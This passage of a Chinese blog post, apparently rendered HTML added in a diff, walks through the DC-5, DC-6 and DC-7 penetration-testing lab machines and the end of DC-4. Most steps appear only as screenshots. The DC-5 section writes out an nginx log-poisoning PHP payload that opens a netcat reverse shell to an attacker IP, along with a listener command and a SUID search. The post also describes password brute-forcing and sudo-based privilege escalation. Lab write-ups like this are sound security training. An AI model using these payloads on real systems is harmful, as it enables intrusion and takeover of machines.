+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203141931230.png" alt="image-20231203141931230"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203142002561.png" alt="image-20231203142002561"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203142458373.png" alt="image-20231203142458373"></p>
+<p>没发现啥能用的，只有一个登陆页面，只能进行爆破，不然就是sql注入。拿到账号密码登录进去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203142705718.png" alt="image-20231203142705718"></p>
+<p>一个系统工具的页面，可以执行三个命令。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203142752285.png" alt="image-20231203142752285"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203142805748.png" alt="image-20231203142805748"></p>
+<p>抓包看看，肯定能改东西</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203142919324.png" alt="image-20231203142919324"></p>
+<p>执行以下whoami，是可以正常返回的，所以我们反弹一个shell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203143053031.png" alt="image-20231203143053031"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203144327305.png" alt="image-20231203144327305"></p>
+<p>写一个交互界面</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203144350336.png" alt="image-20231203144350336"></p>
+<p>查看一下系统版本</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203144924103.png" alt="image-20231203144924103"></p>
+<p>看了一下系统漏洞很少，基本不能用</p>
+<p>看看suid提权呢，可以使用exim4</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203151009501.png" alt="image-20231203151009501"></p>
+<p>找一下漏洞</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203151627481.png" alt="image-20231203151627481"></p>
+<p>把脚本上传到服务器</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203150851560.png" alt="image-20231203150851560"></p>
+<p>在靶机上下载这个脚本</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203150929754.png" alt="image-20231203150929754"></p>
+<p>给执行权限，然后执行，成功getshell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203150942111.png" alt="image-20231203150942111"></p>
+<p>另外一个方法，在jim用户目录下有个备份的密码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203144631792.png" alt="image-20231203144631792"></p>
+<p>写入本地上面使用hydra爆破</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203144731293.png" alt="image-20231203144731293"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203151159971.png" alt="image-20231203151159971"></p>
+<p>成功拿到密码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203151810164.png" alt="image-20231203151810164"></p>
+<p>登录上去看看</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203152435849.png" alt="image-20231203152435849"></p>
+<p>发现有个邮件cat看看</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203152508578.png" alt="image-20231203152508578"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203152556361.png" alt="image-20231203152556361"></p>
+<p>得到了charles的密码,切换到charles用户看看</p>
+<p>他也不是root用户，所以看看他的sudo权限有啥，发现一个nopasswd，应该就是用这个了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203152801408.png" alt="image-20231203152801408"></p>
+<p>然后使用tee提权，创建一个hack账户，然后su到hack，提权成功</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203152959268.png" alt="image-20231203152959268"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231203153016904.png" alt="image-20231203153016904"></p>
+<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204121430132.png" alt="image-20231204121430132"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204121443958.png" alt="image-20231204121443958"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开放的端口：</span><br><span class="line">80</span><br><span class="line">111</span><br><span class="line">36778</span><br></pre></td></tr></table></figure>
+
+<p>进行目录的扫描</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204121626352.png" alt="image-20231204121626352"></p>
+<p>也没有什么敏感的文件路径</p>
+<h2 id="指纹收集"><a href="#指纹收集" class="headerlink" title="指纹收集"></a>指纹收集</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204121508838.png" alt="image-20231204121508838"></p>
+<h2 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h2><p>进入80端口的网页，在contact找到一个交互的页面，看看能不能利用一下，随便提交一个东西上去,url也没什么动静</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204121556035.png" alt="image-20231204121556035"></p>
+<p>注意到之前进行目录扫描时，有一个footer.php，同时在thankyou这个页面的源码中，并没有引用这个footer.php</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204085217585.png" alt="image-20231204085217585"></p>
+<p>所以可能是一个文件包含</p>
+<p>现在需要爆破一下包含的变量名称</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204121807323.png" alt="image-20231204121807323"></p>
+<p>得到变量名之后进行发包查看结果</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204121838105.png" alt="image-20231204121838105"></p>
+<p>由于之前进行网站指纹的收集时，看到使用的是nginx，知道nginx在收到错误请求时会将错误信息写到日志当中去，现在就看看这个错误日志的位置在哪。我们知道nginx默认的安装位置为<code>/etc/nginx/nginx.conf</code></p>
+<p>发包之后看到错误日志的位置</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204121924946.png" alt="image-20231204121924946"></p>
+<p>所以我们先上传一个php的语句执行我们想执行的内容，然后访问包含这个日志文件的地址，就执行了我们自己的php脚本</p>
+<p>e.g. 我们希望执行ls，则php语句为，加入到file之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;ls&quot;) ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204123538467.png" alt="image-20231204123538467"></p>
+<p>包含那个错误日志文件，成功执行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204122253663.png" alt="image-20231204122253663"></p>
+<p>接下来我们准备反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6767</span><br></pre></td></tr></table></figure>
+
+<p>本机开启监听</p>
+<p>写入我们的执行函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nc 10.0.2.15 6767 -e /bin/bash&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204123638618.png" alt="image-20231204123638618"></p>
+<p>访问<code>error.log</code>，成功连接靶机。通过命令显示交互命令行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204130304084.png" alt="image-20231204130304084"></p>
+<p>查看suid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>使用这个漏洞</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204130407263.png" alt="image-20231204130407263"></p>
+<p>查找存在的漏洞</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204130439729.png" alt="image-20231204130439729"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231204130532389.png" alt="image-20231204130532389"></p>
+<p>但是好像在靶机上面直接运行这个脚本会有问题，所以把脚本中的文件给拆解在宿主上面编译再上传靶机，运行即可</p>
+<h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描网段的IP</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231207094222187.png" alt="image-20231207094222187"></p>
+<p>扫描其下开放的端口</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231207094244043.png" alt="image-20231207094244043"></p>
+<p>访问它的80端口，看看有啥。但是自动跳转到wordy域名下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231207094310301.png" alt="image-20231207094310301"></p>
+<p>那就修改本机的host映射</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231207094335465.png" alt="image-20231207094335465"></p>
+<p>成功访问进去，是一个wordpress页面</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231207094440045.png" alt="image-20231207094440045"></p>
+<p>进行目录扫描，查看下面有哪些敏感地址或者后台地址</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231207094603729.png" alt="image-20231207094603729"></p>
+<p>使用wpscan得到拥有的用户名，存在一个文件当中，方便之后的爆破</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231207094728289.png" alt="image-20231207094728289"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231207101314475.png" alt="image-20231207101314475"></p>
+<p>根据作者的提示，获得密码字典</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231207101400470.png" alt="image-20231207101400470"></p>
+<p>使用wpscan进行爆破</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206084429793.png" alt="image-20231206084429793"></p>
+<p>进入后台之后发现使用了Activity monitor插件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206085514081.png" alt="image-20231206085514081"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>搜索存在的漏洞</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206084540564.png" alt="image-20231206084540564"></p>
+<p>将给的html文件复制到当前目录下，修改对应的url和需要执行的反弹shell命令</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206084635459.png" alt="image-20231206084635459"></p>
+<p>开启本地的监听</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206084710390.png" alt="image-20231206084710390"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206084758879.png" alt="image-20231206084758879"></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>弹出交互式命令行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206084737107.png" alt="image-20231206084737107"></p>
+<p>搜索敏感文件，找到一个thingstodo文件中有一个账号和密码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206084847025.png" alt="image-20231206084847025"></p>
+<p>使用ssh连接上去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206084919541.png" alt="image-20231206084919541"></p>
+<p>查看他的sudo权限，有一个不需要密码的提权命令</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206085030949.png" alt="image-20231206085030949"></p>
+<p>这个文件的所有者是jens，所以得到的权限只是jens的，那就继续找有没有可以利用的提权程序</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206085114792.png" alt="image-20231206085114792"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206085139034.png" alt="image-20231206085139034"></p>
+<p>再查看这个用户的权限</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206085209294.png" alt="image-20231206085209294"></p>
+<p>nmap可以插入脚本，并且使用管理员权限来执行。然后输入一个交互的命令，获得root权限</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206085353140.png" alt="image-20231206085353140"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206085425883.png" alt="image-20231206085425883"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231206085448155.png" alt="image-20231206085448155"></p>
+<h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231223002657474.png" alt="image-20231223002657474"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="C:/Users/Adiministrator/AppData/Roaming/Typora/typora-user-images/image-20231223003122195.png" alt="image-20231223003122195"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231223003215831.png" alt="image-20231223003215831"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://imagerepoyu.oss-cn-hangzhou.aliyuncs.com/blogimage-20231223003200137.png" alt="image-20231223003200137"></p>
